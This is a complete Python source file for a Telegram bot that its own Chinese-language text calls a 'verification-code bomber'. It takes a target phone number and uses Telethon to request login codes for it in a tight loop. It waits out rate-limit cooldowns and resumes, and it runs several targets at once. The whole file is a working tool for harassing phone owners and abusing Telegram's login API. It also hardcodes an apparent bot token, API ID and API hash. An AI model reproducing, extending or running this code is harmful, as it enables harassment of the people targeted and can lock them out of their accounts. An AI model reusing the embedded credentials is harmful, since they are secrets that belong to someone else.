import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
import re
import sys
import os
from pathlib import Path
from typing import Dict, Optional
import json

# ==================== 控制台输出重定向到文件 ====================
class TeeLogger:
    """同时输出到控制台和文件"""
    def __init__(self, filename):
        self.terminal = sys.stdout
        log_dir = Path("/storage/emulated/0/TelegramBomb")
        log_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = open(log_dir / filename, 'a', encoding='utf-8')
        
    def write(self, message):
        self.terminal.write(message)
        self.log_file.write(message)
        self.log_file.flush()
        
    def flush(self):
        self.terminal.flush()
        self.log_file.flush()

class TeeErrorLogger:
    """同时输出错误到控制台和文件"""
    def __init__(self, filename):
        self.terminal = sys.stderr
        log_dir = Path("/storage/emulated/0/TelegramBomb")
        log_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = open(log_dir / filename, 'a', encoding='utf-8')
        
    def write(self, message):
        self.terminal.write(message)
        self.log_file.write(message)
        self.log_file.flush()
        
    def flush(self):
        self.terminal.flush()
        self.log_file.flush()

start_time_log = datetime.now().strftime("%Y%m%d_%H%M%S")
log_filename = f"bomb_console_{start_time_log}.txt"
error_log_filename = f"bomb_error_{start_time_log}.txt"

sys.stdout = TeeLogger(log_filename)
sys.stderr = TeeErrorLogger(error_log_filename)

print("=" * 70)
print(f"轰炸机器人启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"控制台日志文件: /storage/emulated/0/TelegramBomb/{log_filename}")
print("=" * 70)
print()

# ==================== 配置区域 ====================
BOT_TOKEN = "8934958837:AAHkQl_QCiQmsGfL66DQGfKih3v2ad3l_xs"
API_ID = 33059943
API_HASH = '1c73a0510ba0b8cb3bd16f24acfd62bf'
PROXY = None
USE_PROXY_ROTATOR = False

# 最大并发任务数
MAX_CONCURRENT_TASKS = 3

# 状态定义
PHONE_NUMBER = 1

# 存储任务数据
class TaskData:
    def __init__(self, phone_number: str, chat_id: int):
        self.phone_number = phone_number
        self.task: Optional[asyncio.Task] = None
        self.chat_id = chat_id
        self.start_time = datetime.now()
        self.success_count = 0
        self.fail_count = 0
        self.cooldown_until: Optional[datetime] = None
        self.is_running = True
        self.is_stopped = False
        self.lock = asyncio.Lock()
        
    def get_status(self) -> Dict:
        """获取任务状态"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return {
            "phone": self.phone_number,
            "success": self.success_count,
            "fail": self.fail_count,
            "elapsed": elapsed,
            "is_running": self.is_running,
            "is_stopped": self.is_stopped,
            "cooldown": self.cooldown_until
        }
    
    def get_display_status(self) -> str:
        """获取显示状态"""
        if self.is_stopped:
            return "⏸ 已停止"
        if self.cooldown_until and self.cooldown_until > datetime.now():
            remaining = (self.cooldown_until - datetime.now()).total_seconds()
            if remaining >= 3600:
                return f"⏳ 冷却 ({remaining/3600:.1f}h)"
            elif remaining >= 60:
                return f"⏳ 冷却 ({remaining/60:.0f}m)"
            else:
                return f"⏳ 冷却 ({remaining:.0f}s)"
        elif self.is_running:
            return "🔥 轰炸中"
        else:
            return "⏸ 已停止"
    
    async def stop(self):
        """停止任务"""
        async with self.lock:
            self.is_running = False
            self.is_stopped = True
        
    async def start(self):
        """启动任务"""
        async with self.lock:
            self.is_running = True
            self.is_stopped = False
            self.cooldown_until = None
        
    async def is_active(self) -> bool:
        """检查任务是否活跃"""
        async with self.lock:
            if self.is_stopped:
                return False
            if not self.is_running:
                return False
            if self.cooldown_until and self.cooldown_until > datetime.now():
                return False
            return True

active_tasks: Dict[str, TaskData] = {}
stats = {
    "total_requests": 0,
    "total_success": 0,
    "total_fails": 0,
    "start_time": datetime.now()
}
stats_lock = asyncio.Lock()

# 存储面板消息ID
panel_messages: Dict[int, int] = {}

# ==================== 辅助函数 ====================
def print_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] [{level}] {message}"
    print(log_msg)

def format_flood_time(seconds):
    if seconds >= 86400:
        return f"{seconds//86400}天"
    elif seconds >= 3600:
        return f"{seconds//3600}小时"
    elif seconds >= 60:
        return f"{seconds//60}分钟"
    else:
        return f"{seconds}秒"

def get_task_management_keyboard(tasks_list: list):
    """获取任务管理键盘"""
    keyboard = []
    for idx, phone in enumerate(tasks_list, 1):
        task_data = active_tasks.get(phone)
        if task_data:
            if task_data.is_stopped:
                keyboard.append([
                    InlineKeyboardButton(f"▶️ 启动 #{idx}", callback_data=f"resume_{phone}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"delete_{phone}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton(f"⏸ 停止 #{idx}", callback_data=f"stop_{phone}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"delete_{phone}")
                ])
    
    keyboard.append([InlineKeyboardButton("➕ 增加配额", callback_data="add_quota")])
    keyboard.append([InlineKeyboardButton("📋 系统日志", callback_data="view_logs")])
    keyboard.append([InlineKeyboardButton("🔄 刷新面板", callback_data="refresh_panel")])
    keyboard.append([InlineKeyboardButton("📊 详细统计", callback_data="detailed_stats")])
    
    return InlineKeyboardMarkup(keyboard)

def format_panel_text() -> str:
    """格式化面板文本"""
    active_count = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
    stopped_count = len([t for t in active_tasks.values() if t.is_stopped])
    total_count = len(active_tasks)
    
    text = (
        "💎 欢迎使用 Telegram 账号轰炸系统(此版本为公益共享版)\n"
        "──────────────────────\n"
        f"本版本永久承诺1分钱不收请关注创作者 https://t.me/APl57\n"
        f"📟 系统状态: 在线 (v3.8 作者 @APl520)\n"
        f"📊 配置账号: {active_count} / {MAX_CONCURRENT_TASKS}\n"
        f"📋 总任务数: {total_count} (活跃: {active_count} | 停止: {stopped_count})\n\n"
    )
    
    if active_tasks:
        text += "[ 实时任务矩阵 ]\n"
        for idx, (phone, task_data) in enumerate(active_tasks.items(), 1):
            status = task_data.get_display_status()
            display_phone = phone if len(phone) <= 15 else f"{phone[:4]}...{phone[-6:]}"
            text += f"#{idx} | {display_phone} | {status}"
            
            if task_data.success_count > 0:
                text += f" | ✅ {task_data.success_count}"
            if task_data.fail_count > 0:
                text += f" | ❌ {task_data.fail_count}"
            text += "\n"
    else:
        text += "[ 实时任务矩阵 ]\n"
        text += "暂无任务，请点击「增加配额」添加\n"
    
    text += "\n──────────────────────"
    
    # 系统统计
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    text += f"\n📊 系统统计:\n"
    text += f"• 运行时间: {elapsed/3600:.1f} 小时\n"
    text += f"• 总请求: {stats['total_requests']}\n"
    text += f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
    if stats['total_requests'] > 0:
        success_rate = (stats['total_success']/stats['total_requests']*100)
    else:
        success_rate = 0
    text += f"• 成功率: {success_rate:.1f}%\n"
    
    return text

async def update_panel(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """更新控制面板"""
    panel_text = format_panel_text()
    tasks_list = list(active_tasks.keys())
    
    try:
        if chat_id in panel_messages:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=panel_messages[chat_id],
                    text=panel_text,
                    reply_markup=get_task_management_keyboard(tasks_list)
                )
                return
            except Exception as e:
                print_log(f"编辑面板消息失败: {e}", "DEBUG")
                if "message to edit not found" in str(e) or "Message can't be edited" in str(e):
                    if chat_id in panel_messages:
                        del panel_messages[chat_id]
        
        message = await context.bot.send_message(
            chat_id=chat_id,
            text=panel_text,
            reply_markup=get_task_management_keyboard(tasks_list)
        )
        panel_messages[chat_id] = message.message_id
    except Exception as e:
        print_log(f"更新面板失败: {e}", "ERROR")

# ==================== 核心轰炸功能 ====================
async def send_verification_fast(phone_number):
    """快速发送验证码请求"""
    temp_client = None
    try:
        print_log(f"发送验证码到 {phone_number}", "DEBUG")
        
        if PROXY:
            temp_client = TelegramClient(
                StringSession(),
                API_ID,
                API_HASH,
                proxy=PROXY,
                timeout=10
            )
        else:
            temp_client = TelegramClient(
                StringSession(),
                API_ID,
                API_HASH,
                timeout=10
            )
        
        await temp_client.connect()
        await temp_client.send_code_request(phone_number)
        await temp_client.disconnect()
        
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_success"] += 1
        
        return True, "成功", 0
        
    except FloodWaitError as e:
        print_log(f"⚠️ {phone_number} 触发限制，等待 {e.seconds}秒", "WARNING")
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_fails"] += 1
        return False, "限制", e.seconds
        
    except Exception as e:
        print_log(f"❌ 发送失败 {phone_number}: {str(e)}", "ERROR")
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_fails"] += 1
        return False, f"错误", 0
    
    finally:
        if temp_client and temp_client.is_connected():
            try:
                await temp_client.disconnect()
            except:
                pass

async def bomb_phone_number(phone_number: str, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """持续轰炸手机号"""
    task_data = active_tasks.get(phone_number)
    if not task_data:
        return
    
    print_log(f"🔥 开始轰炸任务 - 手机号: {phone_number}")
    
    while True:
        if phone_number not in active_tasks:
            break
        
        task_data = active_tasks[phone_number]
        
        if not await task_data.is_active():
            await asyncio.sleep(2)
            continue
        
        if task_data.cooldown_until and task_data.cooldown_until > datetime.now():
            remaining = (task_data.cooldown_until - datetime.now()).total_seconds()
            if remaining > 0:
                wait_time = min(remaining, 60)
                await asyncio.sleep(wait_time)
                continue
        
        try:
            success, message, wait_time = await send_verification_fast(phone_number)
            
            if success:
                task_data.success_count += 1
                
                if task_data.success_count % 30 == 0:
                    await update_panel(chat_id, context)
                
                await asyncio.sleep(0.05)
                
            else:
                task_data.fail_count += 1
                if "限制" in message and wait_time > 0:
                    task_data.cooldown_until = datetime.now() + timedelta(seconds=wait_time)
                    
                    async with task_data.lock:
                        task_data.is_running = False
                    
                    print_log(f"⏸️ {phone_number} 进入冷却，{wait_time}秒", "WARNING")
                    
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=f"⚠️ {phone_number}\n触发限制，冷却 {format_flood_time(wait_time)}"
                        )
                    except:
                        pass
                    
                    await update_panel(chat_id, context)
                    
                    if wait_time < 86400:
                        await asyncio.sleep(wait_time)
                        if phone_number in active_tasks and not active_tasks[phone_number].is_stopped:
                            async with active_tasks[phone_number].lock:
                                active_tasks[phone_number].is_running = True
                                active_tasks[phone_number].cooldown_until = None
                            print_log(f"🔄 {phone_number} 冷却结束，继续轰炸", "INFO")
                            try:
                                await context.bot.send_message(
                                    chat_id=chat_id,
                                    text=f"✅ {phone_number} 冷却结束，继续轰炸"
                                )
                            except:
                                pass
                            await update_panel(chat_id, context)
                    else:
                        print_log(f"🎉 {phone_number} 达到24小时限制！", "INFO")
                        break
            
        except asyncio.CancelledError:
            print_log(f"🛑 {phone_number} 轰炸任务被取消", "WARNING")
            break
        except Exception as e:
            task_data.fail_count += 1
            print_log(f"❌ 轰炸错误 {phone_number}: {str(e)}", "ERROR")
            await asyncio.sleep(0.5)

# ==================== Bot命令处理 ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """启动命令 - 显示主面板"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    print_log(f"用户 {user.id} ({user.first_name}) 启动了机器人")
    
    panel_text = format_panel_text()
    tasks_list = list(active_tasks.keys())
    
    message = await update.message.reply_text(
        panel_text,
        reply_markup=get_task_management_keyboard(tasks_list)
    )
    panel_messages[chat_id] = message.message_id

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理按钮回调"""
    query = update.callback_query
    user = update.effective_user
    chat_id = update.effective_chat.id
    await query.answer()
    
    print_log(f"用户 {user.id} 点击按钮: {query.data}")
    
    if query.data == "refresh_panel":
        panel_text = format_panel_text()
        tasks_list = list(active_tasks.keys())
        await query.edit_message_text(
            panel_text,
            reply_markup=get_task_management_keyboard(tasks_list)
        )
        return
    
    elif query.data == "view_logs":
        log_path = Path(f"/storage/emulated/0/TelegramBomb/{log_filename}")
        if log_path.exists():
            try:
                with open(log_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=f"bomb_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                        caption=f"📄 系统日志\n时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                print_log(f"已发送日志文件给用户 {user.id}")
                await query.edit_message_text(
                    "✅ 日志文件已发送！",
                    reply_markup=get_task_management_keyboard(list(active_tasks.keys()))
                )
            except Exception as e:
                print_log(f"发送日志文件失败: {e}", "ERROR")
                await query.edit_message_text(
                    f"❌ 发送失败: {str(e)[:50]}",
                    reply_markup=get_task_management_keyboard(list(active_tasks.keys()))
                )
        else:
            await query.edit_message_text(
                "❌ 日志文件不存在",
                reply_markup=get_task_management_keyboard(list(active_tasks.keys()))
            )
        return
    
    elif query.data == "detailed_stats":
        active_count = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
        stopped_count = len([t for t in active_tasks.values() if t.is_stopped])
        
        # 计算每个任务的详细统计
        task_details = ""
        if active_tasks:
            task_details = "\n\n📋 任务详情:\n"
            for idx, (phone, task_data) in enumerate(active_tasks.items(), 1):
                display_phone = phone if len(phone) <= 15 else f"{phone[:4]}...{phone[-6:]}"
                status = task_data.get_display_status()
                task_details += f"#{idx} {display_phone}\n"
                task_details += f"  状态: {status}\n"
                task_details += f"  成功: {task_data.success_count} | 失败: {task_data.fail_count}\n"
        
        stats_text = (
            "📊 详细统计信息\n"
            "──────────────────────\n"
            f"📟 系统状态: 在线\n"
            f"🔥 活跃任务: {active_count}/{MAX_CONCURRENT_TASKS}\n"
            f"⏸ 停止任务: {stopped_count}\n"
            f"📋 总任务数: {len(active_tasks)}\n\n"
            f"📈 请求统计:\n"
            f"• 总请求: {stats['total_requests']}\n"
            f"• 成功: {stats['total_success']}\n"
            f"• 失败: {stats['total_fails']}\n"
        )
        
        if stats['total_requests'] > 0:
            success_rate = (stats['total_success']/stats['total_requests']*100)
            stats_text += f"• 成功率: {success_rate:.1f}%\n\n"
        else:
            stats_text += f"• 成功率: 0%\n\n"
        
        stats_text += (
            f"⏰ 运行时间: {(datetime.now() - stats['start_time']).total_seconds()/3600:.1f} 小时\n\n"
            f"📁 日志目录: /storage/emulated/0/TelegramBomb/\n"
            f"📄 当前日志: {log_filename}"
        )
        
        stats_text += task_details
        
        # 如果文本太长，分批显示
        if len(stats_text) > 4000:
            stats_text = stats_text[:3500] + "\n\n... (内容过长，已截断)"
        
        await query.edit_message_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 返回主菜单", callback_data="refresh_panel")]
            ])
        )
        return
    
    elif query.data == "add_quota":
        active_count = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
        if active_count >= MAX_CONCURRENT_TASKS:
            await query.edit_message_text(
                f"❌ 配额已满！\n当前活跃任务: {active_count}/{MAX_CONCURRENT_TASKS}\n请停止或删除任务后再添加",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 返回主菜单", callback_data="refresh_panel")]
                ])
            )
            return
        
        # 开始会话
        await query.edit_message_text(
            "➕ 增加配额\n\n"
            "请输入目标手机号（格式：+8613800138000）:\n\n"
            "📝 示例：+861234567890\n"
            "输入 /cancel 取消操作"
        )
        return PHONE_NUMBER
    
    elif query.data.startswith("stop_"):
        phone = query.data[5:]
        if phone in active_tasks:
            task_data = active_tasks[phone]
            await task_data.stop()
            print_log(f"停止轰炸任务: {phone}")
            panel_text = format_panel_text()
            tasks_list = list(active_tasks.keys())
            await query.edit_message_text(
                panel_text,
                reply_markup=get_task_management_keyboard(tasks_list)
            )
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏸ 已停止: {phone}\n点击「启动」按钮可重新开始"
            )
        else:
            await query.answer("任务不存在", show_alert=True)
        return
    
    elif query.data.startswith("resume_"):
        phone = query.data[7:]
        if phone in active_tasks:
            task_data = active_tasks[phone]
            
            active_count = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
            if active_count >= MAX_CONCURRENT_TASKS:
                await query.answer(f"配额已满！当前活跃: {active_count}/{MAX_CONCURRENT_TASKS}", show_alert=True)
                return
            
            await task_data.start()
            
            print_log(f"重新启动轰炸任务: {phone}")
            panel_text = format_panel_text()
            tasks_list = list(active_tasks.keys())
            await query.edit_message_text(
                panel_text,
                reply_markup=get_task_management_keyboard(tasks_list)
            )
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"▶️ 已启动: {phone}\n轰炸继续进行中..."
            )
        else:
            await query.answer("任务不存在", show_alert=True)
        return
    
    elif query.data.startswith("delete_"):
        phone = query.data[7:]
        if phone in active_tasks:
            task_data = active_tasks[phone]
            if task_data.task and not task_data.task.done():
                task_data.task.cancel()
                try:
                    await task_data.task
                except asyncio.CancelledError:
                    pass
            del active_tasks[phone]
            print_log(f"删除轰炸任务: {phone}")
            panel_text = format_panel_text()
            tasks_list = list(active_tasks.keys())
            await query.edit_message_text(
                panel_text,
                reply_markup=get_task_management_keyboard(tasks_list)
            )
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"🗑️ 已删除: {phone}"
            )
        else:
            await query.answer("任务不存在", show_alert=True)
        return

async def add_quota_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """增加配额回调处理"""
    query = update.callback_query
    await query.answer()
    return await button_callback(update, context)

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """接收手机号并开始轰炸"""
    phone_number = update.message.text.strip()
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    print_log(f"用户 {user.id} 输入手机号: {phone_number}")
    
    if phone_number.startswith('/'):
        return ConversationHandler.END
    
    if not re.match(r'^\+\d{7,15}$', phone_number):
        await update.message.reply_text(
            "❌ 手机号格式错误！\n格式: +8613800138000\n\n请重新输入或输入 /cancel 取消"
        )
        return PHONE_NUMBER
    
    if phone_number in active_tasks:
        await update.message.reply_text(f"⚠️ {phone_number} 已经在任务列表中！")
        await update_panel(chat_id, context)
        return ConversationHandler.END
    
    active_count = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
    if active_count >= MAX_CONCURRENT_TASKS:
        await update.message.reply_text(
            f"❌ 配额已满！\n当前活跃任务: {active_count}/{MAX_CONCURRENT_TASKS}\n请停止或删除任务后再添加"
        )
        return ConversationHandler.END
    
    task_data = TaskData(phone_number, chat_id)
    active_tasks[phone_number] = task_data
    
    task = asyncio.create_task(bomb_phone_number(phone_number, chat_id, context))
    task_data.task = task
    
    print_log(f"✅ 已创建轰炸任务: {phone_number}")
    
    await update_panel(chat_id, context)
    
    await update.message.reply_text(
        f"✅ 已开始轰炸 {phone_number}\n\n"
        f"📊 配额使用: {active_count+1}/{MAX_CONCURRENT_TASKS}"
    )
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """取消操作"""
    chat_id = update.effective_chat.id
    await update.message.reply_text("❌ 已取消")
    panel_text = format_panel_text()
    tasks_list = list(active_tasks.keys())
    message = await update.message.reply_text(
        panel_text,
        reply_markup=get_task_management_keyboard(tasks_list)
    )
    panel_messages[chat_id] = message.message_id
    return ConversationHandler.END

# ==================== 主函数 ====================
def main():
    print_log("=" * 70)
    print_log("💣 Telegram 验证码轰炸机启动")
    print_log(f"📁 日志路径: /storage/emulated/0/TelegramBomb/")
    print_log(f"📄 日志文件: {log_filename}")
    print_log(f"⚡ 最大并发: {MAX_CONCURRENT_TASKS}")
    print_log("=" * 70)
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # 修复 ConversationHandler 配置
        conv_handler = ConversationHandler(
            entry_points=[CallbackQueryHandler(button_callback, pattern="^add_quota$")],
            states={
                PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
            },
            fallbacks=[
                CommandHandler("cancel", cancel),
                CommandHandler("start", start)  # 添加 start 作为回退
            ],
            allow_reentry=True
        )
        
        # 添加处理器
        application.add_handler(CommandHandler("start", start))
        application.add_handler(conv_handler)
        
        # 处理所有其他按钮回调（排除 add_quota，因为已经被 ConversationHandler 处理）
        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(refresh_panel|view_logs|detailed_stats|stop_.*|resume_.*|delete_.*)$"))
        
        print_log("✅ 机器人启动成功，开始轮询...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print_log(f"❌ 启动失败: {str(e)}", "ERROR")
        raise

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_log("用户手动停止程序")
    except Exception as e:
        print_log(f"程序异常: {str(e)}", "ERROR")